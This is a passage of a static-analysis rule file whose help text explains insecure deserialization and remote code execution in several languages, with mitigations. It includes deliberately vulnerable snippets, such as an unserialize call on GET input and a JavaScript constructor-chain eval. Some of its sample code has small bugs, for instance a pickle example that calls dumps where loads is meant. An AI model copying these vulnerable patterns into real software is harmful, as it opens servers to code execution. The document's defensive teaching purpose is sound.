to perform denial-of-service attacks, read sensitive information and achieve remote\ncode execution if they are used to unserialize untrusted contents.\n\n## Mitigation\n\nThe easiest way to avoid deserialization vulnerabilities is to avoid using serialization altogether. If you need to \naccept structured data from an HTTP request, XML or JSON are more common formats and less prone to malicious use. .NET \noffers several built-in serializers that can handle untrusted data safely:\n\n* System.Xml.Serialization.XmlSerializer and System.Runtime.Serialization.DataContractSerializer to serialize object graphs into and from XML. \n* System.Io.BinaryReader and System.Io.BinaryWriter for writing and reading binary data.\n* The System.Text.Json APIs to serialize object graphs into JSON.\n\nIf your legacy code uses any of the module mentioned in the previous section, you should ensure your data streams come \nfrom a trusted source, deserialize to an expected form, and cannot be tampered with. You should never unserialize data \nsent from an HTTP request.\n\nHere's how to restrict the permitted types the BinaryFormatter can deserialize to:\n\ncsharp\nsealed class TypeRestrictionBinder : SerializationBinder\n{\n    // These are the only types we will allow to be unserialized when reading a data stream.\n    private static string[] permittedTypes = { \"Type1\", \"Type2\", \"Type3\" };\n\n    public override Type BindToType(string assemblyName, string typeName)\n    {\n        if (!(permittedTypes.Contains(typeName)))\n        {\n            throw new SerializationException($\"Not a permitted type: {typeName}\"); \n        }\n        \n        return Assembly.Load(assemblyName).GetType(typeName);\n    }\n}\n\nvar deserializer    = new BinaryFormatter();\ndeserializer.Binder = new TypeRestrictionBinder();\ndeserializer.Deserialize(stream);\n\n\n:::\n\n:::tab[Python]\n\n## Serialization in Python\n\nThere are a number of ways to serialize data in Python: the pickle module has dumps(...) and loads(...) functions\nto write in-memory objects to binary form and read them back in. The NumPy library is frequently used to write and read\narray data, and the Google's Protobuf library allows you to serialize objects in a language-neutral way.\n\nUnserializing data using pickle.loads(...) function - or using the shelve module, which is backed by pickle - can\nresult in arbitrary code execution. Any class which defines a method called __setstate__(state) will have that method\ninvoked when the data-stream is unpickled. This will allow an attacker to execute code on your server if they you \nunpickle untrusted content.\n\nDeserialization vulnerabilities can also occur when reading in YAML (*Yet Another Markup Language*) files. YAML is a popular\nfile format for storing configuration values, but the default loader in the yaml module allows the YAML file to \nspecify which classes YAML files deserialize to using the !!python/object tag:\n\npython\nimport yaml\n\nclass Hero:\n  def __init__(self, name, hp, sp):\n    self.name = name\n    self.hp = hp\n    self.sp = sp\n\n# This will return an instance of the Hero class      \nyaml.load(\"\"\"\n!!python/object:__main__.Hero\nname: Welthyr Syxgon\nhp: 1200\nsp: 0\n\"\"\", Loader=yaml.Loader)\n\n\n## Mitigation\n\nThe easiest way to avoid deserialization vulnerabilities is to avoid using serialization altogether. If you need to \naccept structured data from an HTTP request, XML or JSON are more common formats and less prone to malicious use.\n\nYou can securely deserialize YAML files by turning off the support for custom classes using the yaml.SafeLoader class:\n\npython\n\n# This will return an array with form ['First', 'Second', 'Third'], but will\n# not support custom classes.\nyaml.load(\"\"\"\n- First\n- Second\n- Third\n\"\"\", Loader=yaml.SafeLoader)\n\n\nIf you *do* use the pickle module, you should ensure your byte or object streams come from a trusted source, \ndeserialize to an expected form, and cannot be tampered with. Since code can be executed during the unpickling process,\nyou should never unpickle data sent from an HTTP request.\n\nTo detect tampering of pickled objects, you should generate a digital signature when you write out a byte stream for \nlater use, then verify that signature when reading the objects back in:\n\npython\nimport pickle, hmac, hashlib\n\n# Only those possessing the secret key will be able to generate a valid signature.\nsecret_key = b'0c07187d-5fd7-486f-a3a2-699200a623a5'\n\n# The signature can be shared publicly, along with the serialized data.\npickled_data = pickle.dumps(data)\nsignature    = hmac.new(secret_key, pickled_data, hashlib.sha1).hexdigest()\n\n# Here we recalculate the signature to check if the data has been tampered with.\nuntrusted_data         = pickled_data\nrecalculated_signature = hmac.new(secret_key, untrusted_data, hashlib.sha1).hexdigest()\n\n# A change in signature indicates this data isn't safe to deserialize.\nif signature != recalculated_signature:\n  raise Exception('Data has been tampered with')\n\n# If the newly calculated signature is the same as the old value, the data has not\n# been tampered with. (Only those in possession of the signing key will be able to\n# generate a valid signature.)\npickle.dumps(untrusted_data)\n\n\n:::\n\n:::tab[Scala]\n\n## Serialization in Scala\n\nScala objects can be serialized into a stream of bytes using the java.io.ObjectOutputStream class. Most built-in Scala\nobjects and classes extend the scala.Serializable trait, meaning they are easily transformed into binary data. You can\nextend the trait in the same way for your own custom classes.\n\nIn addition to this, there are also a number of third-party libraries like Google Protocol Buffers that can serialize \nand deserialize objects in a language-neutral way - allowing you to send and receive objects to and from other \nplatforms.\n\nSerialization is used during *Remote Method Invocation* (RMI) calls in distributed computing environments. However, if \nyou unserialize data coming from an untrusted source, this gives an attacker an opportunity to inject malicious code \ndirectly into your Java Virtual Machine:\n\nscala\ndef uploadObject = Action { request =>\n  val bytes : ByteString = request.body.asRaw.get.asBytes().get\n\n  // Since this object is taken from the HTTP request, we are deserializing a potentially malicious object.\n  val deserializedObject = new ObjectInputStream(new ByteArrayInputStream(bytes.toArray)).readObject()\n\n  Ok(\"Object uploaded\")\n}\n\n\n## Mitigation\n\nThe easiest way to avoid deserialization vulnerabilities is to avoid using serialization altogether. If you need to \naccept structured data from an HTTP request, XML or JSON are more common formats and less prone to malicious use.\n\nIf you *do* use serialization, you should ensure your byte or object streams come from a trusted source, deserialize to \nan expected form, and cannot be tampered with. At a minimum, your code should make assertions about the class of each \nobject as it is deserialized, as a way of reducing the attack surface:\n\nscala\ndef uploadObject = Action { request =>\n  val bytes : ByteString = request.body.asRaw.get.asBytes().get\n\n  val deserializedObject = new ObjectInputStream(new ByteArrayInputStream(bytes.toArray)).readObject()\n\n  // Checking the type of the object reduces some of the risks.\n  if (!deserialzedObject.isInstanceOf(MyExpectedType.class)) {\n    Redirect(\"/\")\n  }\n  else {\n    Ok(\"Object uploaded\")\n  }\n}\n\n\nTo detect tampering, you can generate a digital signature when you write out a byte stream for later use, then verify\nthat signature when reading the objects back in:\n\nscala\n/**\n * Generate a signature for some bytes we wish to secure using a the HMAC-SHA1 algorithm.\n * Only we will know the secret key, so we can detect data-tampering by recalculating\n * the signature at a later point in time.\n */\ndef sign(data: Array[Byte], secretKey: String): String = {\n  val mac = Mac.getInstance(\"HmacSHA1\")\n  mac.init(new SecretKeySpec(secretKey.getBytes(StandardCharsets.UTF_8), \"HmacSHA1\"))\n  Codecs.toHexString(mac.doFinal(data))\n}\n\n\n:::\n\n:::tab[Go]\n\n## Serialization in Go\n\nThere are a number of ways to serialize data in Go. The built-in encoding/gob encodes binary streams of data, and\nthe google.golang.org/protobuf package implements the Protocol Buffers mechanism for serializing data to and from \nother languages. There are also third-party libraries like Cap'n Proto that skip the encoding and decoding step \nentirely, taking advantage of the fact that structs are encoded in Go in a platform-independent manner.\n\nIf the serialization library you use allows invocation of methods during the deserialization process, this gives an\nattacker a way to launch Remote Code Execution (RPC) attacks. \n\nSerialization is used to allow remote procedure calls on, for example, a grid computing application. Go is often for big \ndata tasks, and using remote procedure calls to distribute large processing tasks is a common approach. In this \narchitectural model you are responsible for ensuring all remote calls come from authorized \n servers.\n\n## Mitigation\n\nTo avoid deserialization vulnerabilities ensure your serialization library does not invocation of methods during the \ndeserialization process. You should also ensure your byte or object streams come from a trusted source, deserialize to \nan expected form, and cannot be tampered with. \n\nTo detect tampering of serialized objects, you can generate a digital signature when you write out a byte stream for \nlater use, then verify that signature when reading the objects back in. The crypto/dsa package allows you easily\ngenerate digital signatures for structs in Go:\n\ngo\nimport (\n  \"crypto/dsa\"\n}\n\n// sign generates a digital signature as a unique fingerprint for a byte stream.\nfunc sign(hash []byte, key *dsa.PrivateKey) ([]byte, error) {\n  var s dsaSignature\n  s.R, s.S, err = dsa.Sign(rand.Reader, key, hash)\n  \n  if err != nil {\n    return nil, err\n  }\n\n  return asn1.Marshal(s)\n}\n\n// verify checks digital signature in order to detect tampering.\nfunc verify(hash []byte, key *dsa.PublicKey, signatureFile string) ([]byte, error) {\n  r, s, err := ParseSignatureFromFile(signatureFile)\n  \n  if err != nil {\n    return nil, err\n  }\n  \n  if dsa.Verify(pub, hash, r, s) {\n    return []byte(\"Verified OK\\n\"), nil\n  } else {\n    return nil, errors.New(\"Verification Failure\")\n  }\n}\n\n\n\n:::\n\n:::tab[PHP]\n\nIn PHP, the serialize() function converts an object into a storable representation (a string), while the unserialize() function restores the original object from its stored representation. However, using unserialize() on data coming from untrusted sources exposes a PHP application to code injection and remote code execution.\n\nConsider the following simple vulnerable example:\n\nphp\n$data = $_GET['data'];\n$object = unserialize($data);\n\n\nBy passing a specially crafted serialized object, an attacker can potentially exploit vulnerable __wakeup() or __destruct() magic methods in PHP objects to trigger execution of arbitrary code.\n\n## Mitigation\n\n1. **Avoid Deserialization**: The safest approach is not to deserialize data from untrusted sources. Use safer data interchange formats like JSON (json_encode(), json_decode()) or XML. The json_decode() function, for example, does not invoke any object constructors or methods, making it inherently safer:\n\nphp\n$data = $_GET['data'];\n$array = json_decode($data, true);\n\n\n2. **Restrict Object Instantiation**: If you must use unserialize(), restrict which objects can be instantiated by providing a list of allowed classes using the second parameter of unserialize():\n\nphp\n$allowed_classes = ['MySafeClass1', 'MySafeClass2'];\n$object = unserialize($data, [\"allowed_classes\" => $allowed_classes]);\n\n\nEnsure that all methods in these classes can deal safely with untrusted inputs.\n\n3. **Validation and Integrity Checks**: Before deserializing, validate the serialized data or use cryptographic techniques to ensure its integrity and authenticity. For instance, you can sign the serialized data with a HMAC, and verify integrity before deserialization:\n\nphp\nfunction generateHMAC($data, $key) {\n    return hash_hmac('sha256', $data, $key);\n}\n\n// Generating HMAC\n$serializedData = serialize($someObject);\n$hmac = generateHMAC($serializedData, SECRET_KEY);\n\n// Verifying HMAC before deserialization\nif (hash_equals(generateHMAC($receivedData, SECRET_KEY), $receivedHMAC)) {\n    $object = unserialize($receivedData);\n} else {\n    die('Data integrity check failed.');\n}\n\n\nIn the above example, SECRET_KEY is a secret cryptographic key only known to the server. The HMAC ensures that the serialized data has not been tampered with by an attacker.\n\n:::\n\n::::\n\n## Additional information\n\n**[CWE-502](https://cwe.mitre.org/data/definitions/502.html)**\n\n**[OWASP-A8](https://owasp.org/www-project-top-ten/OWASP_Top_Ten_2017/Top_10-2017_A8-Insecure_Deserialization)**.",
                "markdown": "Attacker-controlled data is deserialized. This indicates an insecure deserialization vulnerability.\n\n# Insecure Deserialization\n\n*Serialization* describes the process of writing in-memory code object to a binary form, typically for storage to disk\nor transmission across a network. *Deserialization* is the opposite process: transforming incoming binary data into\nan in-memory code object. If your code uses deserialization, you need to ensure it is not deserializing untrusted input:\nthe presents an opportunity for an attacker to inject malicious code into your web-server at runtime.\n\n::::tabs\n\n:::tab[Java]\n\nJava objects can be serialized into a stream of bytes using the `java.io.ObjectOutputStream` class. Most built-in Java\nclasses are serializable, and you can customize how your own classes are serialized by implementing the \n`java.io.Serialazable` interface, and, if needs be, writing your own serialization code.\n\nSerialization is used during *Remote Method Invocation* (RMI) calls, and provides an easy way to store data structures \nto disk for later us. However, if you unserialize data coming from an untrusted source - like binary data attached to an\nHTTP request - this gives an attacker an opportunity to inject malicious code directly into your Java runtime.\n\n```java\npublic class DeserializationServlet extends HttpServlet\n{\n    protected void service(HttpServletRequest request, HttpServletResponse response) throws IOException\n    {\n        try {\n            ServletInputStream stream       = request.getInputStream();\n            ObjectInputStream  objectStream = new ObjectInputStream(stream);\n\n            // This object is taken from an untrusted source and is potentially malicious.\n            Object deserialized = objectStream.readObject();\n        }\n        catch (ClassNotFoundException ex) {\n\n        }\n    }\n}\n```\n\n## Mitigation\n\nThe easiest way to avoid deserialization vulnerabilities is to avoid using serialization altogether. If you need to \naccept structured data from an HTTP request, XML or JSON are more common formats and less prone to malicious use.\n\nIf you *do* use serialization, ensure your byte streams come from a trusted source, deserialize to an expected form,\nand cannot be tampered with. Your code should make assertions about the class of each object as it is deserialized, as\na way of reducing the attack surface:\n\n```java\nServletInputStream stream = request.getInputStream();\n            \n// Restricting the classes we deserialize to reduces the risk.\nObjectInputStream objectStream = new ObjectInputStream(stream) {\n    protected Class<?> resolveClass(ObjectStreamClass osc) throws IOException, ClassNotFoundException {\n        if (!osc.getName().equals(java.util.HashMap.class.getName())) {\n            throw new InvalidClassException(\"Unexpected class\", osc.getName());\n        }\n        \n        return super.resolveClass(osc);\n    }\n};\n\nObject deserialized = objectStream.readObject();\n```\n\nTo detect tampering, you can generate a digital signature when you write out a byte stream for later use, then verify\nthat signature when reading the objects back in:\n\n```java\n/**\n * Generate a digital signature for some binary data, so we can verify it has not\n * been tampered with if it is returned from an untrusted source.\n */\npublic static String signData(byte[] data) throws Exception\n{\n    KeyPair keyPair = getKeyPair();\n\n    Signature signature = Signature.getInstance(\"SHA1WithRSA\");\n    signature.initSign(keyPair.getPrivate());\n    signature.update(data);\n\n    byte[] bytes = signature.sign();\n    \n    return Base64.getEncoder().encodeToString(bytes);\n}\n```\n\n:::\n\n:::tab[C#]\n\n## Serialization in C#\n\nThere is a number of ways to serialize data in ASP.NET: the `BinaryFormatter` can serializes and deserializes an object,\nor an entire graph of connected objects, in binary format. There are also a number of other serializers with more \nspecific uses:\n\n* `System.Runtime.Serialization.Formatters.Soap.SoapFormatter` - for serialization to and from SOAP format.\n* `System.Runtime.Serialization.NetDataContractSerializer` - for serialization to and from XML format.\n* `System.Web.UI.ObjectStateFormatter` - used for page state persistence.\n* `System.Web.UI.LosFormatter` - serializes the view state for a Web Forms page.\n\nEach of these allow an attacker to perform denial-of-service attacks, read sensitive information and achieve remote\ncode execution if they are used to unserialize untrusted contents.\n\n## Mitigation\n\nThe easiest way to avoid deserialization vulnerabilities is to avoid using serialization altogether. If you need to \naccept structured data from an HTTP request, XML or JSON are more common formats and less prone to malicious use. .NET \noffers several built-in serializers that can handle untrusted data safely:\n\n* `System.Xml.Serialization.XmlSerializer` and `System.Runtime.Serialization.DataContractSerializer` to serialize object graphs into and from XML. \n* `System.Io.BinaryReader` and `System.Io.BinaryWriter` for writing and reading binary data.\n* The `System.Text.Json` APIs to serialize object graphs into JSON.\n\nIf your legacy code uses any of the module mentioned in the previous section, you should ensure your data streams come \nfrom a trusted source, deserialize to an expected form, and cannot be tampered with. You should never unserialize data \nsent from an HTTP request.\n\nHere's how to restrict the permitted types the `BinaryFormatter` can deserialize to:\n\n```csharp\nsealed class TypeRestrictionBinder : SerializationBinder\n{\n    // These are the only types we will allow to be unserialized when reading a data stream.\n    private static string[] permittedTypes = { \"Type1\", \"Type2\", \"Type3\" };\n\n    public override Type BindToType(string assemblyName, string typeName)\n    {\n        if (!(permittedTypes.Contains(typeName)))\n        {\n            throw new SerializationException($\"Not a permitted type: {typeName}\"); \n        }\n        \n        return Assembly.Load(assemblyName).GetType(typeName);\n    }\n}\n\nvar deserializer    = new BinaryFormatter();\ndeserializer.Binder = new TypeRestrictionBinder();\ndeserializer.Deserialize(stream);\n```\n\n:::\n\n:::tab[Python]\n\n## Serialization in Python\n\nThere are a number of ways to serialize data in Python: the `pickle` module has `dumps(...)` and `loads(...)` functions\nto write in-memory objects to binary form and read them back in. The NumPy library is frequently used to write and read\narray data, and the Google's Protobuf library allows you to serialize objects in a language-neutral way.\n\nUnserializing data using `pickle.loads(...)` function - or using the `shelve` module, which is backed by `pickle` - can\nresult in arbitrary code execution. Any class which defines a method called `__setstate__(state)` will have that method\ninvoked when the data-stream is unpickled. This will allow an attacker to execute code on your server if they you \nunpickle untrusted content.\n\nDeserialization vulnerabilities can also occur when reading in YAML (*Yet Another Markup Language*) files. YAML is a popular\nfile format for storing configuration values, but the default loader in the `yaml` module allows the YAML file to \nspecify which classes YAML files deserialize to using the `!!python/object` tag:\n\n```python\nimport yaml\n\nclass Hero:\n  def __init__(self, name, hp, sp):\n    self.name = name\n    self.hp = hp\n    self.sp = sp\n\n# This will return an instance of the Hero class      \nyaml.load(\"\"\"\n!!python/object:__main__.Hero\nname: Welthyr Syxgon\nhp: 1200\nsp: 0\n\"\"\", Loader=yaml.Loader)\n```\n\n## Mitigation\n\nThe easiest way to avoid deserialization vulnerabilities is to avoid using serialization altogether. If you need to \naccept structured data from an HTTP request, XML or JSON are more common formats and less prone to malicious use.\n\nYou can securely deserialize YAML files by turning off the support for custom classes using the `yaml.SafeLoader` class:\n\n```python\n\n# This will return an array with form ['First', 'Second', 'Third'], but will\n# not support custom classes.\nyaml.load(\"\"\"\n- First\n- Second\n- Third\n\"\"\", Loader=yaml.SafeLoader)\n```\n\nIf you *do* use the `pickle` module, you should ensure your byte or object streams come from a trusted source, \ndeserialize to an expected form, and cannot be tampered with. Since code can be executed during the unpickling process,\nyou should never unpickle data sent from an HTTP request.\n\nTo detect tampering of pickled objects, you should generate a digital signature when you write out a byte stream for \nlater use, then verify that signature when reading the objects back in:\n\n```python\nimport pickle, hmac, hashlib\n\n# Only those possessing the secret key will be able to generate a valid signature.\nsecret_key = b'0c07187d-5fd7-486f-a3a2-699200a623a5'\n\n# The signature can be shared publicly, along with the serialized data.\npickled_data = pickle.dumps(data)\nsignature    = hmac.new(secret_key, pickled_data, hashlib.sha1).hexdigest()\n\n# Here we recalculate the signature to check if the data has been tampered with.\nuntrusted_data         = pickled_data\nrecalculated_signature = hmac.new(secret_key, untrusted_data, hashlib.sha1).hexdigest()\n\n# A change in signature indicates this data isn't safe to deserialize.\nif signature != recalculated_signature:\n  raise Exception('Data has been tampered with')\n\n# If the newly calculated signature is the same as the old value, the data has not\n# been tampered with. (Only those in possession of the signing key will be able to\n# generate a valid signature.)\npickle.dumps(untrusted_data)\n```\n\n:::\n\n:::tab[Scala]\n\n## Serialization in Scala\n\nScala objects can be serialized into a stream of bytes using the `java.io.ObjectOutputStream` class. Most built-in Scala\nobjects and classes extend the `scala.Serializable` trait, meaning they are easily transformed into binary data. You can\nextend the trait in the same way for your own custom classes.\n\nIn addition to this, there are also a number of third-party libraries like Google Protocol Buffers that can serialize \nand deserialize objects in a language-neutral way - allowing you to send and receive objects to and from other \nplatforms.\n\nSerialization is used during *Remote Method Invocation* (RMI) calls in distributed computing environments. However, if \nyou unserialize data coming from an untrusted source, this gives an attacker an opportunity to inject malicious code \ndirectly into your Java Virtual Machine:\n\n```scala\ndef uploadObject = Action { request =>\n  val bytes : ByteString = request.body.asRaw.get.asBytes().get\n\n  // Since this object is taken from the HTTP request, we are deserializing a potentially malicious object.\n  val deserializedObject = new ObjectInputStream(new ByteArrayInputStream(bytes.toArray)).readObject()\n\n  Ok(\"Object uploaded\")\n}\n```\n\n## Mitigation\n\nThe easiest way to avoid deserialization vulnerabilities is to avoid using serialization altogether. If you need to \naccept structured data from an HTTP request, XML or JSON are more common formats and less prone to malicious use.\n\nIf you *do* use serialization, you should ensure your byte or object streams come from a trusted source, deserialize to \nan expected form, and cannot be tampered with. At a minimum, your code should make assertions about the class of each \nobject as it is deserialized, as a way of reducing the attack surface:\n\n```scala\ndef uploadObject = Action { request =>\n  val bytes : ByteString = request.body.asRaw.get.asBytes().get\n\n  val deserializedObject = new ObjectInputStream(new ByteArrayInputStream(bytes.toArray)).readObject()\n\n  // Checking the type of the object reduces some of the risks.\n  if (!deserialzedObject.isInstanceOf(MyExpectedType.class)) {\n    Redirect(\"/\")\n  }\n  else {\n    Ok(\"Object uploaded\")\n  }\n}\n```\n\nTo detect tampering, you can generate a digital signature when you write out a byte stream for later use, then verify\nthat signature when reading the objects back in:\n\n```scala\n/**\n * Generate a signature for some bytes we wish to secure using a the HMAC-SHA1 algorithm.\n * Only we will know the secret key, so we can detect data-tampering by recalculating\n * the signature at a later point in time.\n */\ndef sign(data: Array[Byte], secretKey: String): String = {\n  val mac = Mac.getInstance(\"HmacSHA1\")\n  mac.init(new SecretKeySpec(secretKey.getBytes(StandardCharsets.UTF_8), \"HmacSHA1\"))\n  Codecs.toHexString(mac.doFinal(data))\n}\n```\n\n:::\n\n:::tab[Go]\n\n## Serialization in Go\n\nThere are a number of ways to serialize data in Go. The built-in `encoding/gob` encodes binary streams of data, and\nthe `google.golang.org/protobuf` package implements the Protocol Buffers mechanism for serializing data to and from \nother languages. There are also third-party libraries like Cap'n Proto that skip the encoding and decoding step \nentirely, taking advantage of the fact that structs are encoded in Go in a platform-independent manner.\n\nIf the serialization library you use allows invocation of methods during the deserialization process, this gives an\nattacker a way to launch Remote Code Execution (RPC) attacks. \n\nSerialization is used to allow remote procedure calls on, for example, a grid computing application. Go is often for big \ndata tasks, and using remote procedure calls to distribute large processing tasks is a common approach. In this \narchitectural model you are responsible for ensuring all remote calls come from authorized \n servers.\n\n## Mitigation\n\nTo avoid deserialization vulnerabilities ensure your serialization library does not invocation of methods during the \ndeserialization process. You should also ensure your byte or object streams come from a trusted source, deserialize to \nan expected form, and cannot be tampered with. \n\nTo detect tampering of serialized objects, you can generate a digital signature when you write out a byte stream for \nlater use, then verify that signature when reading the objects back in. The `crypto/dsa` package allows you easily\ngenerate digital signatures for structs in Go:\n\n```go\nimport (\n  \"crypto/dsa\"\n}\n\n// sign generates a digital signature as a unique fingerprint for a byte stream.\nfunc sign(hash []byte, key *dsa.PrivateKey) ([]byte, error) {\n  var s dsaSignature\n  s.R, s.S, err = dsa.Sign(rand.Reader, key, hash)\n  \n  if err != nil {\n    return nil, err\n  }\n\n  return asn1.Marshal(s)\n}\n\n// verify checks digital signature in order to detect tampering.\nfunc verify(hash []byte, key *dsa.PublicKey, signatureFile string) ([]byte, error) {\n  r, s, err := ParseSignatureFromFile(signatureFile)\n  \n  if err != nil {\n    return nil, err\n  }\n  \n  if dsa.Verify(pub, hash, r, s) {\n    return []byte(\"Verified OK\\n\"), nil\n  } else {\n    return nil, errors.New(\"Verification Failure\")\n  }\n}\n\n```\n\n:::\n\n:::tab[PHP]\n\nIn PHP, the `serialize()` function converts an object into a storable representation (a string), while the `unserialize()` function restores the original object from its stored representation. However, using `unserialize()` on data coming from untrusted sources exposes a PHP application to code injection and remote code execution.\n\nConsider the following simple vulnerable example:\n\n```php\n$data = $_GET['data'];\n$object = unserialize($data);\n```\n\nBy passing a specially crafted serialized object, an attacker can potentially exploit vulnerable `__wakeup()` or `__destruct()` magic methods in PHP objects to trigger execution of arbitrary code.\n\n## Mitigation\n\n1. **Avoid Deserialization**: The safest approach is not to deserialize data from untrusted sources. Use safer data interchange formats like JSON (`json_encode()`, `json_decode()`) or XML. The `json_decode()` function, for example, does not invoke any object constructors or methods, making it inherently safer:\n\n```php\n$data = $_GET['data'];\n$array = json_decode($data, true);\n```\n\n2. **Restrict Object Instantiation**: If you must use `unserialize()`, restrict which objects can be instantiated by providing a list of allowed classes using the second parameter of `unserialize()`:\n\n```php\n$allowed_classes = ['MySafeClass1', 'MySafeClass2'];\n$object = unserialize($data, [\"allowed_classes\" => $allowed_classes]);\n```\n\nEnsure that all methods in these classes can deal safely with untrusted inputs.\n\n3. **Validation and Integrity Checks**: Before deserializing, validate the serialized data or use cryptographic techniques to ensure its integrity and authenticity. For instance, you can sign the serialized data with a HMAC, and verify integrity before deserialization:\n\n```php\nfunction generateHMAC($data, $key) {\n    return hash_hmac('sha256', $data, $key);\n}\n\n// Generating HMAC\n$serializedData = serialize($someObject);\n$hmac = generateHMAC($serializedData, SECRET_KEY);\n\n// Verifying HMAC before deserialization\nif (hash_equals(generateHMAC($receivedData, SECRET_KEY), $receivedHMAC)) {\n    $object = unserialize($receivedData);\n} else {\n    die('Data integrity check failed.');\n}\n```\n\nIn the above example, `SECRET_KEY` is a secret cryptographic key only known to the server. The HMAC ensures that the serialized data has not been tampered with by an attacker.\n\n:::\n\n::::\n\n## Additional information\n\n**[CWE-502](https://cwe.mitre.org/data/definitions/502.html)**\n\n**[OWASP-A8](https://owasp.org/www-project-top-ten/OWASP_Top_Ten_2017/Top_10-2017_A8-Insecure_Deserialization)**."
              },
              "name": "Deserialization",
              "properties": {
                "tags": [
                  "ng-sast"
                ],
                "precision": "very-high"
              },
              "defaultConfiguration": {
                "level": "error"
              },
              "fullDescription": {
                "text": "Attacker-controlled data is deserialized. This indicates an insecure deserialization vulnerability."
              },
              "helpUri": "https://docs.shiftleft.io/ngsast/product-info/coverage#vulnerabilities",
              "shortDescription": {
                "text": "Deserialization"
              }
            },
            {
              "id": "code-injection-attacker-controlled",
              "help": {
                "text": "Attacker-controlled data is used in a code execution context without undergoing escaping or validation. This indicates a remote code execution vulnerability.\n\n# Remote Code Execution\n\nA **remote code execution** (RCE) vulnerability allows an attacker to execute arbitrary code on you server. On a\nweb-server, RCE vulnerabilities are typically cause when untrusted input from the HTTP request is evaluated as code.\n\n::::tabs\n\n:::tab[Java]\n\n## Remote Code Execution in Java\n\nDynamic evaluation of code in Java can be achieved in a number of ways. The Java scripting API (defined in the\njavax.script page) package allows you to evaluate code in a number of different scripting languages via the \nScriptEngineManager class. There are, for instance, JVM compatible versions of Python (called Jython) and Ruby (called\nJRuby) that can be loaded as jars and invoked via the script manager.\n\nThe Java compiler can also be invoked programmatically via the javax.tools.JavaCompiler interface. This approach is\noften used by build tools, which convert files on disk to runnable code that can be loaded into the JVM.\n\nFinally, there are a number of other tools that allow dynamic evaluation of code. The Apache Bean Scripting Framework\na range of scripting languages, and the scripting languages like Groovy can be added to the Java runtime by simply\nadding a jar in the classpath.\n\nWith all of these approaches, it is of vital importance that you only pass trusted code to the scripting API. Passing \nuntrusted content to the ScriptingEngine class, for instance,  will allow an attacker to execute arbitrary code in \nyour Java Virtual Machine - meaning they can steal sensitive information, read files from disk, or install malware.\n\nTo secure your code, you should ensure any strings passed to a scripting engine are taken from a trusted source, or \nvalidated against an allow-list:\n\njava\nprotected void doPost(HttpServletRequest request, HttpServletResponse response) throws IOException \n{\n  String code = request.getParameter(\"script\");\n\n  // Since we are taking the code to execute from an untrusted source (the HTTP\n  // request) we *must* validate against an allowed list of scripts.      \n  if (!allowedCommands.contains(code))\n    throw new IOException(\"Not permitted\");\n\n  ScriptEngineManager manager = new ScriptEngineManager();\n  ScriptEngine        engine  = manager.getEngineByName(\"JavaScript\");\n  engine.eval(input);\n  \n  response.setStatus(200);\n}\n\n\n## Further Considerations\n\nDynamic code evaluation is often used where there is a need to develop a *Domain Specific Language* (DSL) for expert \nusers. In such a scenario, it is preferable to execute DSL statements in a sandbox with limited permissions. (For\ninstance, you probably want to limit disk and network access if you are simply evaluating mathematical statements.) One\nway to achieve this is by formally defining the grammar of the DSL, and using a tool like Java Compiler Compiler (JavaCC)\nor ANTLR to generate a parser that can evaluate scripts at runtime. Since the grammar specification defines which\nfunctions are executable, you have full control over what the DSL can do.\n\n:::\n\n:::tab[C#]\n\n## Remote Code Execution in C#\n\nC# code can be evaluated dynamically using the Code Document Object Model (CodeDOM) module, defined in the \nSystem.CodeDom namespace. CodeDOM allows for templated code generation and dynamic compilation within the .NET \nruntime.\n\nPassing untrusted string as code to be evaluated allows an attacker to execute arbitrary code in your C# runtime -\nmeaning they can steal sensitive information, read files from disk, or install malware. This is very \ndangerous!\n\nTo mitigate remote code execution attacks, you must ensure any strings are taken from a trusted source, or validated \nagainst an allow-list. To be totally secure, it's often better to using the CodeDOM module in applications that face\nthe internet.\n\n## Domain Specific Languages\n\nDynamic evaluation is often used to build *Domain Specific Languages* (DSLs) that allow expert users to write simple\nexpressions that query data or encode business logic. If you find yourself writing a DSL in .NET, consider using one of\nthe following solutions:\n\n* Microsoft's DSL Tools, that come bundled with Visual Studio and allow the visual creation of DSLs.\n* A scripting language like Lua that can be dynamically loaded and executed within the .NET runtime.\n* ANTLR, a parser generator that can be used to generate and execute sand-boxed languages.\n\n:::\n\n:::tab[JavaScript]\n\n## Remote Code Execution in JavaScript Using Eval\n\nJavaScript makes dynamic evaluation of strings as code very easy by making the eval(...) function available. For\ninstance, the following JavaScript code will print \"WARNING\" to the console:\n\njavascript\n  eval(\"console.log('WARNING')\")\n\n\nIf an attacker is able to control the input to an eval(...) call by passing it in an HTTP request, they can run code\non your server. This will allow them to scan your file system, install a remote shell, and take over your server \ncompletely.\n\n## Other Types of Remote Code Execution in JavaScript\n\nInput strings can also be dynamically evaluated as code in the JavaScript runtime using the Function(...) or\nScript(...) constructors. There are various subtle ways of doing this, as illustrated by the following code:\n\njavascript\nconst arbitraryObject = {},\n      a = 'constructor',\n      b = 'constructor',\n      s = 'console.log(\"Hacked!\")';\n\n// This will print the phrase 'Hacked!' to the console.\narbitraryObject[a][b](s)()\n\n\nThese two lines of code illustrate an RCE vulnerability. Properties can be looked up on a JavaScript object by name, \nand this includes functions. The illustrated exploit gets the constructor function for an arbitrary object, looks up \nrhe constructor function for the constructor (which is actually Function(...)), passes it a command string, then \nexecutes that string. \n\nAlthough this example is contrived, it illustrates how any code that has the form:\n\njavascript\narbitraryObject[parameterA][parameterB](parameterC)()\n\n\n...enables a remote execution attack if all the parameters can be controlled by an attacker.\n\n## Mitigation\n\n* Don't use the eval(...) function in your code. Check your codebase with a linter as part of your build process.\n* Consider disabling use of eval(...) in the Node.js runtime by passing the --disallow-code-generation-from-strings\n  at startup. (You will have to ensure none of your dependencies use the eval(...) function to do this.)\n* Validate all untrusted input with allow-lists: check any input take from the HTTP request is safe before processing \n  it.\n* If you make nested lookups on objects, make assertions about object types when pulling them from another object. If\n  your code finds a function where it expects a string, don't invoke it!\n\n:::\n\n:::tab[Python]\n\n## Remote Code Execution in Python\n\nPython code can be evaluated dynamically using the global eval(...) and exec(...) functions. The former expects\na string representing a (single) valid Python expression, while the later can execute multiple expressions - making it \nable to create new module, class, and function definitions. Both functions have access to the global and local state\nat the point of invocation.\n\nPassing untrusted string as code to be evaluated allows an attacker to execute arbitrary code in your Python runtime -\nmeaning they can steal sensitive information, read files from disk, or install malware. This is very \ndangerous!\n\nTo mitigate remote code execution attacks, you must ensure any strings are taken from a trusted source, or validated \nagainst an allow-list. To be totally secure, it's often better to avoid eval(...) and exec(...) functions of Python \naltogether. \n\n## Domain Specific Languages\n\nDynamic evaluation is often used to build *Domain Specific Languages* (DSLs) that allow 